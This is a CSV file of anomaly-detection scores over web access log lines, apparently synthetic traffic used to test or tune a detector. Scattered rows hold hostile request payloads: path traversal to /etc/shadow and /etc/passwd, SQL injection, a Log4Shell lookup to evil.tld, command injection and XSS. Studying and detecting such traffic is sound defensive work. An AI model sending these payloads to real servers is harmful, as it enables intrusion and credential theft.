score_content,score_session,score_fused,score_fused_norm,line
72.43733978271484,,72.43733978271484,72.43733978271484,134.11.59.161 - - [10/Jan/2025:12:29:05 +0000] "HEAD /search?q=ssd HTTP/1.1" 302 13918 "https://news.ycombinator.com/" "nikto/2.5.0"
30.150592803955078,,30.150592803955078,30.150592803955078,207.246.203.39 - - [10/Jan/2025:12:29:08 +0000] "DELETE /api/products HTTP/1.1" 302 15219 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
95.03669738769531,,95.03669738769531,95.03669738769531,47.4.23.237 - - [10/Jan/2025:12:29:08 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 12039 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
69.54192352294922,,69.54192352294922,69.54192352294922,74.111.83.242 - - [10/Jan/2025:12:29:08 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 7486 "-" "Wget/1.21.2 (linux-gnu)"
24.378190994262695,,24.378190994262695,24.378190994262695,239.181.50.1 - - [10/Jan/2025:12:29:08 +0000] "GET /search?q=phone HTTP/1.1" 200 12094 "https://news.ycombinator.com/" "python-requests/2.31.0"
30163.912109375,,30163.912109375,30163.912109375,103.242.109.145 - - [10/Jan/2025:12:29:11 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 401 1293 "https://twitter.com/" "nikto/2.5.0"
3.1514105796813965,,3.1514105796813965,3.1514105796813965,203.140.35.109 - - [10/Jan/2025:12:29:13 +0000] "GET /assets/app.css HTTP/1.1" 304 16963 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
0.2293166071176529,,0.2293166071176529,0.2293166071176529,247.232.150.69 - - [10/Jan/2025:12:29:16 +0000] "GET /assets/app.css HTTP/1.1" 200 14467 "https://example.com/" "sqlmap/1.7.2#stable"
4.682557106018066,,4.682557106018066,4.682557106018066,222.103.42.79 - - [10/Jan/2025:12:29:19 +0000] "POST /api/products HTTP/1.1" 200 1089 "https://example.com/" "python-requests/2.31.0"
3.183363199234009,,3.183363199234009,3.183363199234009,235.78.159.128 - - [10/Jan/2025:12:29:20 +0000] "GET /assets/app.js HTTP/1.1" 304 19977 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
102.2286148071289,,102.2286148071289,102.2286148071289,104.64.113.158 - - [10/Jan/2025:12:29:23 +0000] "TRACE /.git/config HTTP/1.1" 200 11267 "https://twitter.com/" "sqlmap/1.7.2#stable"
35.47396469116211,,35.47396469116211,35.47396469116211,24.132.120.119 - - [10/Jan/2025:12:29:24 +0000] "PUT /search?q=router HTTP/1.1" 200 2335 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.1792674958705902,,0.1792674958705902,0.1792674958705902,196.35.48.254 - - [10/Jan/2025:12:29:27 +0000] "GET /../../etc/passwd HTTP/1.1" 201 13006 "https://www.google.com/" "dirb/2.22"
30.196775436401367,,30.196775436401367,30.196775436401367,57.112.231.252 - - [10/Jan/2025:12:29:29 +0000] "DELETE /profile HTTP/1.1" 302 14933 "https://news.ycombinator.com/" "curl/7.85.0"
38.47390365600586,,38.47390365600586,38.47390365600586,75.144.124.22 - - [10/Jan/2025:12:29:29 +0000] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 304 14085 "https://news.ycombinator.com/" "curl/7.85.0"
13.232596397399902,,13.232596397399902,13.232596397399902,106.178.201.205 - - [10/Jan/2025:12:29:29 +0000] "PUT /login HTTP/1.1" 200 6365 "https://example.com/" "curl/7.85.0"
4.741281986236572,,4.741281986236572,4.741281986236572,36.254.182.156 - - [10/Jan/2025:12:29:30 +0000] "POST /contact HTTP/1.1" 200 9514 "https://news.ycombinator.com/" "nikto/2.5.0"
47.17497634887695,,47.17497634887695,47.17497634887695,18.82.85.177 - - [10/Jan/2025:12:29:31 +0000] "HEAD /logout HTTP/1.1" 200 6979 "https://twitter.com/" "sqlmap/1.7.2#stable"
27.357892990112305,,27.357892990112305,27.357892990112305,15.146.106.161 - - [10/Jan/2025:12:29:32 +0000] "DELETE /login HTTP/1.1" 204 5387 "https://example.com/" "curl/7.85.0"
5.822868347167969,,5.822868347167969,5.822868347167969,97.139.36.128 - - [10/Jan/2025:12:29:32 +0000] "POST /cgi-bin/test.cgi HTTP/1.1" 304 15579 "https://example.com/" "nikto/2.5.0"
2.069895029067993,,2.069895029067993,2.069895029067993,111.192.52.101 - - [10/Jan/2025:12:29:32 +0000] "GET /logout HTTP/1.1" 200 13233 "-" "python-requests/2.31.0"
49.5926399230957,,49.5926399230957,49.5926399230957,120.25.29.213 - - [10/Jan/2025:12:29:32 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 4434 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
94.99481964111328,,94.99481964111328,94.99481964111328,236.188.227.29 - - [10/Jan/2025:12:29:33 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 5596 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.164794921875,,47.164794921875,47.164794921875,61.45.54.147 - - [10/Jan/2025:12:29:33 +0000] "HEAD /logout HTTP/1.1" 200 1813 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30.252439498901367,,30.252439498901367,30.252439498901367,217.102.33.71 - - [10/Jan/2025:12:29:33 +0000] "DELETE /login HTTP/1.1" 301 15365 "https://example.com/" "sqlmap/1.7.2#stable"
5.248058795928955,,5.248058795928955,5.248058795928955,45.224.185.247 - - [10/Jan/2025:12:29:36 +0000] "GET / HTTP/1.1" 304 16920 "https://example.com/" "python-requests/2.31.0"
24.372478485107422,,24.372478485107422,24.372478485107422,196.27.251.128 - - [10/Jan/2025:12:29:38 +0000] "GET /search?q=phone HTTP/1.1" 200 10234 "https://example.com/" "sqlmap/1.7.2#stable"
0.5400328636169434,,0.5400328636169434,0.5400328636169434,236.16.65.91 - - [10/Jan/2025:12:29:39 +0000] "GET /.env HTTP/1.1" 200 11230 "https://example.com/" "python-requests/2.31.0"
49.652347564697266,,49.652347564697266,49.652347564697266,24.38.7.173 - - [10/Jan/2025:12:29:42 +0000] "DELETE /search?q=camera HTTP/1.1" 200 17155 "https://twitter.com/" "python-requests/2.31.0"
2.2988576889038086,,2.2988576889038086,2.2988576889038086,200.100.26.214 - - [10/Jan/2025:12:29:45 +0000] "GET / HTTP/1.1" 200 5776 "-" "sqlmap/1.7.2#stable"
2.3357410430908203,,2.3357410430908203,2.3357410430908203,70.155.80.238 - - [10/Jan/2025:12:29:47 +0000] "GET / HTTP/1.1" 200 18121 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
72.76390838623047,,72.76390838623047,72.76390838623047,31.131.243.81 - - [10/Jan/2025:12:29:47 +0000] "OPTIONS /about HTTP/1.1" 200 934 "https://example.com/" "python-requests/2.31.0"
30141.0234375,,30141.0234375,30141.0234375,188.157.227.229 - - [10/Jan/2025:12:29:47 +0000] "GET /assets/app.js HTTP/1.1" 429 437 "https://twitter.com/" "nikto/2.5.0"
0.2264549881219864,,0.2264549881219864,0.2264549881219864,237.112.104.250 - - [10/Jan/2025:12:29:49 +0000] "GET /assets/app.css HTTP/1.1" 200 13455 "https://news.ycombinator.com/" "nikto/2.5.0"
2.0361239910125732,,2.0361239910125732,2.0361239910125732,220.87.186.55 - - [10/Jan/2025:12:29:50 +0000] "GET /contact HTTP/1.1" 200 14093 "https://www.google.com/" "curl/7.85.0"
48.602210998535156,,48.602210998535156,48.602210998535156,26.103.4.115 - - [10/Jan/2025:12:29:52 +0000] "HEAD /.env HTTP/1.1" 304 18058 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
4.837975025177002,,4.837975025177002,4.837975025177002,129.106.139.180 - - [10/Jan/2025:12:29:55 +0000] "POST /login HTTP/1.1" 200 17351 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.065828323364258,,27.065828323364258,27.065828323364258,122.237.107.65 - - [10/Jan/2025:12:29:58 +0000] "POST /search?q=phone HTTP/1.1" 204 4484 "https://example.com/" "sqlmap/1.7.2#stable"
69.45491027832031,,69.45491027832031,69.45491027832031,107.22.55.80 - - [10/Jan/2025:12:30:01 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 9746 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
5.169248104095459,,5.169248104095459,5.169248104095459,31.210.38.239 - - [10/Jan/2025:12:30:01 +0000] "GET / HTTP/1.1" 302 1570 "https://www.google.com/" "curl/7.85.0"
47.0955696105957,,47.0955696105957,47.0955696105957,2.119.195.233 - - [10/Jan/2025:12:30:03 +0000] "HEAD /api/products HTTP/1.1" 200 8052 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
48.548851013183594,,48.548851013183594,48.548851013183594,136.203.94.103 - - [10/Jan/2025:12:30:03 +0000] "HEAD /.env HTTP/1.1" 302 13092 "https://www.google.com/" "python-requests/2.31.0"
0.2593285143375397,,0.2593285143375397,0.2593285143375397,192.175.223.35 - - [10/Jan/2025:12:30:03 +0000] "GET /assets/app.js HTTP/1.1" 200 16525 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
126.38630676269531,,126.38630676269531,126.38630676269531,238.68.14.65 - - [10/Jan/2025:12:30:06 +0000] "TRACE /search?q=ssd HTTP/1.1" 201 17865 "https://news.ycombinator.com/" "nikto/2.5.0"
24.277315139770508,,24.277315139770508,24.277315139770508,9.76.188.86 - - [10/Jan/2025:12:30:06 +0000] "GET /search?q=headphones HTTP/1.1" 200 10819 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
72.38037109375,,72.38037109375,72.38037109375,241.214.121.102 - - [10/Jan/2025:12:30:06 +0000] "HEAD /search?q=laptop HTTP/1.1" 304 6409 "https://twitter.com/" "dirb/2.22"
35.48221206665039,,35.48221206665039,35.48221206665039,26.96.107.250 - - [10/Jan/2025:12:30:07 +0000] "PUT /search?q=camera HTTP/1.1" 200 5949 "https://www.google.com/" "curl/7.85.0"
26.978015899658203,,26.978015899658203,26.978015899658203,198.178.94.26 - - [10/Jan/2025:12:30:09 +0000] "POST /search?q=headphones HTTP/1.1" 200 5229 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
0.2232338786125183,,0.2232338786125183,0.2232338786125183,102.118.47.80 - - [10/Jan/2025:12:30:09 +0000] "GET /assets/app.css HTTP/1.1" 200 12351 "https://twitter.com/" "dirb/2.22"
26.971269607543945,,26.971269607543945,26.971269607543945,96.112.43.55 - - [10/Jan/2025:12:30:10 +0000] "POST /search?q=headphones HTTP/1.1" 204 5274 "https://twitter.com/" "dirb/2.22"
46.960350036621094,,46.960350036621094,46.960350036621094,58.148.141.116 - - [10/Jan/2025:12:30:10 +0000] "HEAD /server-status HTTP/1.1" 200 8113 "-" "dirb/2.22"
95.10913848876953,,95.10913848876953,95.10913848876953,17.226.51.23 - - [10/Jan/2025:12:30:12 +0000] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 3382 "https://www.google.com/" "sqlmap/1.7.2#stable"
13.257055282592773,,13.257055282592773,13.257055282592773,91.64.104.245 - - [10/Jan/2025:12:30:12 +0000] "PUT /about HTTP/1.1" 200 14184 "https://www.google.com/" "sqlmap/1.7.2#stable"
30139.76953125,,30139.76953125,30139.76953125,90.39.164.251 - - [10/Jan/2025:12:30:14 +0000] "GET /assets/app.css HTTP/1.1" 401 406 "https://example.com/" "python-requests/2.31.0"
72.68822479248047,,72.68822479248047,72.68822479248047,7.161.20.236 - - [10/Jan/2025:12:30:14 +0000] "OPTIONS /contact HTTP/1.1" 200 6662 "https://example.com/" "sqlmap/1.7.2#stable"
2.3064863681793213,,2.3064863681793213,2.3064863681793213,109.212.242.252 - - [10/Jan/2025:12:30:17 +0000] "GET / HTTP/1.1" 200 8064 "https://www.google.com/" "curl/7.85.0"
126.2872314453125,,126.2872314453125,126.2872314453125,143.124.73.160 - - [10/Jan/2025:12:30:19 +0000] "TRACE /search?q=camera HTTP/1.1" 200 8312 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
72.75581359863281,,72.75581359863281,72.75581359863281,8.153.173.139 - - [10/Jan/2025:12:30:20 +0000] "OPTIONS /admin HTTP/1.1" 200 1447 "-" "curl/7.85.0"
126.32638549804688,,126.32638549804688,126.32638549804688,128.43.30.98 - - [10/Jan/2025:12:30:20 +0000] "TRACE /search?q=phone HTTP/1.1" 200 13620 "https://www.google.com/" "dirb/2.22"
30243.6484375,,30243.6484375,30243.6484375,230.99.208.168 - - [10/Jan/2025:12:30:23 +0000] "TRACE /about HTTP/1.1" 403 699 "https://example.com/" "nikto/2.5.0"
27.281330108642578,,27.281330108642578,27.281330108642578,205.109.7.10 - - [10/Jan/2025:12:30:24 +0000] "DELETE /profile HTTP/1.1" 204 4611 "https://example.com/" "sqlmap/1.7.2#stable"
47.22671890258789,,47.22671890258789,47.22671890258789,11.223.235.89 - - [10/Jan/2025:12:30:24 +0000] "HEAD /admin HTTP/1.1" 200 11281 "https://www.google.com/" "python-requests/2.31.0"
52.44987487792969,,52.44987487792969,52.44987487792969,9.225.128.105 - - [10/Jan/2025:12:30:25 +0000] "DELETE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 301 6566 "-" "curl/7.85.0"
3.2549736499786377,,3.2549736499786377,3.2549736499786377,62.12.202.156 - - [10/Jan/2025:12:30:25 +0000] "GET /index.html HTTP/1.1" 304 15336 "https://twitter.com/" "python-requests/2.31.0"
27.3798770904541,,27.3798770904541,27.3798770904541,147.200.59.25 - - [10/Jan/2025:12:30:28 +0000] "DELETE /login HTTP/1.1" 200 10013 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
69.52288818359375,,69.52288818359375,69.52288818359375,253.58.238.253 - - [10/Jan/2025:12:30:31 +0000] "HEAD /api/user?id=1;DROP TABLE users HTTP/1.1" 200 8565 "https://twitter.com/" "sqlmap/1.7.2#stable"
72.79900360107422,,72.79900360107422,72.79900360107422,112.241.81.48 - - [10/Jan/2025:12:30:34 +0000] "OPTIONS /about HTTP/1.1" 200 19303 "https://www.google.com/" "sqlmap/1.7.2#stable"
13.233926773071289,,13.233926773071289,13.233926773071289,70.47.210.68 - - [10/Jan/2025:12:30:35 +0000] "PUT /logout HTTP/1.1" 200 19885 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
4.648625373840332,,4.648625373840332,4.648625373840332,215.188.126.52 - - [10/Jan/2025:12:30:36 +0000] "POST /phpmyadmin HTTP/1.1" 200 11404 "https://example.com/" "python-requests/2.31.0"
24.327972412109375,,24.327972412109375,24.327972412109375,27.194.237.4 - - [10/Jan/2025:12:30:37 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 11766 "https://example.com/" "dirb/2.22"
129.37928771972656,,129.37928771972656,129.37928771972656,183.212.150.248 - - [10/Jan/2025:12:30:40 +0000] "TRACE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 304 2255 "https://news.ycombinator.com/" "python-requests/2.31.0"
30175.064453125,,30175.064453125,30175.064453125,66.69.33.49 - - [10/Jan/2025:12:30:43 +0000] "PUT /search?q=laptop HTTP/1.1" 401 252 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
3.204413414001465,,3.204413414001465,3.204413414001465,225.58.12.19 - - [10/Jan/2025:12:30:45 +0000] "GET /index.html HTTP/1.1" 301 18828 "https://www.google.com/" "python-requests/2.31.0"
27.148231506347656,,27.148231506347656,27.148231506347656,44.173.124.12 - - [10/Jan/2025:12:30:47 +0000] "GET /search?q=headphones HTTP/1.1" 302 9389 "-" "python-requests/2.31.0"
30144.255859375,,30144.255859375,30144.255859375,195.130.61.245 - - [10/Jan/2025:12:30:50 +0000] "POST /profile HTTP/1.1" 400 306 "-" "Wget/1.21.2 (linux-gnu)"
30166.119140625,,30166.119140625,30166.119140625,179.174.140.97 - - [10/Jan/2025:12:30:53 +0000] "DELETE /..%2f..%2fetc%2fpasswd HTTP/1.1" 429 1195 "-" "nikto/2.5.0"
30139.787109375,,30139.787109375,30139.787109375,149.208.21.66 - - [10/Jan/2025:12:30:54 +0000] "GET /assets/app.js HTTP/1.1" 401 456 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
30166.904296875,,30166.904296875,30166.904296875,110.176.107.37 - - [10/Jan/2025:12:30:56 +0000] "DELETE /login HTTP/1.1" 401 716 "https://www.google.com/" "curl/7.85.0"
16.127578735351562,,16.127578735351562,16.127578735351562,98.146.160.196 - - [10/Jan/2025:12:30:57 +0000] "PUT /login HTTP/1.1" 302 12462 "https://twitter.com/" "dirb/2.22"
16.112699508666992,,16.112699508666992,16.112699508666992,34.127.12.159 - - [10/Jan/2025:12:30:59 +0000] "PUT /admin HTTP/1.1" 302 7750 "https://www.google.com/" "python-requests/2.31.0"
49.65061950683594,,49.65061950683594,49.65061950683594,31.132.16.25 - - [10/Jan/2025:12:30:59 +0000] "DELETE /search?q=phone HTTP/1.1" 200 8762 "-" "Wget/1.21.2 (linux-gnu)"
11042.708984375,,11042.708984375,11042.708984375,224.239.204.227 - - [10/Jan/2025:12:31:01 +0000] "PUT /about HTTP/1.1" 500 138 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.755971908569336,,4.755971908569336,4.755971908569336,163.95.217.248 - - [10/Jan/2025:12:31:01 +0000] "POST /contact HTTP/1.1" 200 14409 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
94.9720687866211,,94.9720687866211,94.9720687866211,59.147.40.174 - - [10/Jan/2025:12:31:04 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 15408 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
7.6767377853393555,,7.6767377853393555,7.6767377853393555,99.82.249.215 - - [10/Jan/2025:12:31:05 +0000] "POST /contact HTTP/1.1" 304 16393 "https://example.com/" "curl/7.85.0"
24.412750244140625,,24.412750244140625,24.412750244140625,242.66.6.14 - - [10/Jan/2025:12:31:08 +0000] "GET /api/product?id=123 HTTP/1.1" 200 14378 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
129.18270874023438,,129.18270874023438,129.18270874023438,145.134.79.127 - - [10/Jan/2025:12:31:08 +0000] "TRACE /search?q=monitor HTTP/1.1" 304 8669 "-" "python-requests/2.31.0"
30175.03125,,30175.03125,30175.03125,23.191.71.25 - - [10/Jan/2025:12:31:10 +0000] "PUT /api/backup?file=../../../../etc/shadow HTTP/1.1" 400 640 "https://twitter.com/" "python-requests/2.31.0"
0.2284039855003357,,0.2284039855003357,0.2284039855003357,162.113.180.35 - - [10/Jan/2025:12:31:12 +0000] "GET /assets/app.js HTTP/1.1" 200 6337 "https://example.com/" "python-requests/2.31.0"
25.572893142700195,,25.572893142700195,25.572893142700195,201.22.83.241 - - [10/Jan/2025:12:31:14 +0000] "DELETE /.git/config HTTP/1.1" 200 9156 "https://news.ycombinator.com/" "dirb/2.22"
103.867919921875,,103.867919921875,103.867919921875,158.48.97.8 - - [10/Jan/2025:12:31:15 +0000] "TRACE /phpmyadmin HTTP/1.1" 200 13149 "https://twitter.com/" "python-requests/2.31.0"
95.039306640625,,95.039306640625,95.039306640625,205.172.48.214 - - [10/Jan/2025:12:31:18 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 12923 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
69.69115447998047,,69.69115447998047,69.69115447998047,149.149.210.233 - - [10/Jan/2025:12:31:21 +0000] "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 17593 "-" "nikto/2.5.0"
27.00469970703125,,27.00469970703125,27.00469970703125,143.63.44.117 - - [10/Jan/2025:12:31:22 +0000] "POST /search?q=headphones HTTP/1.1" 200 13648 "https://example.com/" "nikto/2.5.0"
2.332828998565674,,2.332828998565674,2.332828998565674,78.252.152.235 - - [10/Jan/2025:12:31:25 +0000] "GET / HTTP/1.1" 200 16980 "https://example.com/" "curl/7.85.0"
105.08268737792969,,105.08268737792969,105.08268737792969,113.19.71.218 - - [10/Jan/2025:12:31:26 +0000] "TRACE /.git/config HTTP/1.1" 301 6992 "-" "python-requests/2.31.0"
35.492305755615234,,35.492305755615234,35.492305755615234,68.88.22.124 - - [10/Jan/2025:12:31:26 +0000] "PUT /search?q=laptop HTTP/1.1" 200 8987 "https://twitter.com/" "sqlmap/1.7.2#stable"
30186.76171875,,30186.76171875,30186.76171875,66.85.221.199 - - [10/Jan/2025:12:31:27 +0000] "HEAD /contact HTTP/1.1" 403 636 "-" "python-requests/2.31.0"
27.111839294433594,,27.111839294433594,27.111839294433594,69.109.220.247 - - [10/Jan/2025:12:31:27 +0000] "POST /api/product?id=123 HTTP/1.1" 200 7904 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
75.65831756591797,,75.65831756591797,75.65831756591797,25.208.201.249 - - [10/Jan/2025:12:31:29 +0000] "OPTIONS /contact HTTP/1.1" 302 139 "https://example.com/" "python-requests/2.31.0"
27.358482360839844,,27.358482360839844,27.358482360839844,212.128.153.126 - - [10/Jan/2025:12:31:31 +0000] "DELETE /login HTTP/1.1" 200 2904 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.39154624938965,,27.39154624938965,27.39154624938965,144.205.240.172 - - [10/Jan/2025:12:31:31 +0000] "DELETE /about HTTP/1.1" 200 13912 "-" "curl/7.85.0"
49.5080680847168,,49.5080680847168,49.5080680847168,143.18.158.148 - - [10/Jan/2025:12:31:32 +0000] "DELETE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 11737 "https://www.google.com/" "sqlmap/1.7.2#stable"
3.2795121669769287,,3.2795121669769287,3.2795121669769287,249.116.217.204 - - [10/Jan/2025:12:31:35 +0000] "POST /.env HTTP/1.1" 200 18678 "https://twitter.com/" "nikto/2.5.0"
35.53623962402344,,35.53623962402344,35.53623962402344,4.219.2.9 - - [10/Jan/2025:12:31:37 +0000] "PUT /search?q=laptop HTTP/1.1" 200 250 "https://www.google.com/" "curl/7.85.0"
30139.75,,30139.75,30139.75,57.137.224.136 - - [10/Jan/2025:12:31:39 +0000] "GET /assets/app.css HTTP/1.1" 400 254 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
4.9569525718688965,,4.9569525718688965,4.9569525718688965,145.194.222.102 - - [10/Jan/2025:12:31:42 +0000] "GET /logout HTTP/1.1" 304 4294 "-" "sqlmap/1.7.2#stable"
30141.55078125,,30141.55078125,30141.55078125,87.79.166.223 - - [10/Jan/2025:12:31:42 +0000] "GET /dashboard HTTP/1.1" 403 1149 "https://www.google.com/" "nikto/2.5.0"
0.2881765365600586,,0.2881765365600586,0.2881765365600586,79.116.27.74 - - [10/Jan/2025:12:31:45 +0000] "GET /assets/app.js HTTP/1.1" 200 220 "https://example.com/" "dirb/2.22"
126.3038558959961,,126.3038558959961,126.3038558959961,118.70.134.141 - - [10/Jan/2025:12:31:48 +0000] "TRACE /search?q=router HTTP/1.1" 200 13706 "-" "Wget/1.21.2 (linux-gnu)"
3.197490930557251,,3.197490930557251,3.197490930557251,244.26.35.54 - - [10/Jan/2025:12:31:49 +0000] "GET /wp-login.php HTTP/1.1" 304 15271 "https://twitter.com/" "dirb/2.22"
69.53533172607422,,69.53533172607422,69.53533172607422,219.206.89.126 - - [10/Jan/2025:12:31:50 +0000] "HEAD /api/product?id=123 HTTP/1.1" 204 14971 "-" "nikto/2.5.0"
0.2192697376012802,,0.2192697376012802,0.2192697376012802,208.206.96.54 - - [10/Jan/2025:12:31:51 +0000] "GET /assets/app.js HTTP/1.1" 200 3133 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
97.88200378417969,,97.88200378417969,97.88200378417969,97.175.251.43 - - [10/Jan/2025:12:31:53 +0000] "OPTIONS /search?q=camera HTTP/1.1" 301 8699 "-" "Wget/1.21.2 (linux-gnu)"
30144.32421875,,30144.32421875,30144.32421875,165.185.132.1 - - [10/Jan/2025:12:31:55 +0000] "POST /phpmyadmin HTTP/1.1" 404 316 "-" "sqlmap/1.7.2#stable"
2.33721661567688,,2.33721661567688,2.33721661567688,98.16.200.73 - - [10/Jan/2025:12:31:58 +0000] "GET / HTTP/1.1" 200 18713 "https://twitter.com/" "curl/7.85.0"
95.07923126220703,,95.07923126220703,95.07923126220703,117.251.170.153 - - [10/Jan/2025:12:31:58 +0000] "OPTIONS /search?q=phone HTTP/1.1" 200 19373 "https://twitter.com/" "nikto/2.5.0"
126.2363510131836,,126.2363510131836,126.2363510131836,92.166.154.75 - - [10/Jan/2025:12:31:59 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 16155 "https://twitter.com/" "python-requests/2.31.0"
24.431114196777344,,24.431114196777344,24.431114196777344,225.243.149.141 - - [10/Jan/2025:12:31:59 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 4697 "https://twitter.com/" "python-requests/2.31.0"
27.028974533081055,,27.028974533081055,27.028974533081055,39.82.78.21 - - [10/Jan/2025:12:32:02 +0000] "POST /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 6207 "https://example.com/" "sqlmap/1.7.2#stable"
11056.6201171875,,11056.6201171875,11056.6201171875,208.88.239.116 - - [10/Jan/2025:12:32:03 +0000] "POST /api/backup?file=../../../../etc/shadow HTTP/1.1" 503 1317 "https://twitter.com/" "python-requests/2.31.0"
26.97966957092285,,26.97966957092285,26.97966957092285,91.155.70.51 - - [10/Jan/2025:12:32:05 +0000] "POST /search?q=headphones HTTP/1.1" 200 1131 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
25.432920455932617,,25.432920455932617,25.432920455932617,115.135.203.244 - - [10/Jan/2025:12:32:07 +0000] "DELETE /../../etc/passwd HTTP/1.1" 200 3596 "https://www.google.com/" "python-requests/2.31.0"
52.49026107788086,,52.49026107788086,52.49026107788086,2.11.225.196 - - [10/Jan/2025:12:32:07 +0000] "DELETE /search?q=monitor HTTP/1.1" 301 18416 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.407482147216797,,24.407482147216797,24.407482147216797,39.232.104.186 - - [10/Jan/2025:12:32:08 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12542 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
